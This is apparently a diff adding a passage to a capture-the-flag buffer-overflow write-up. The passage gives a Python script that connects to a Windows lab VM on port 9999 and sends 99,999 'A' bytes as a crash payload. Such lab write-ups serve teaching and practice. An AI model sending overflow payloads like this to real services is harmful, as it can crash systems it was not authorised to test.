@@ -89,4 +89,21 @@ As we can see in the bottom-right-hand corner, the program is now running:
 
 ![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/13b5e01d-5ec3-46e6-813c-e31afa8500f1)
 
+We now craft our script in python that will send our payload:
 
+```
+#!/usr/bin/env python3
+
+import sys,socket
+
+garbage = b'A'*99999
+
+try:
+  socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  socket.connect(("our-windows-vm-victim", 9999))
+  socket.send(garbage)
+except:
+  print("Couldn't connct to our windows vm")
+```
+
+We execute the python script using python3 and don't get any output, which means it ran without any errors. 
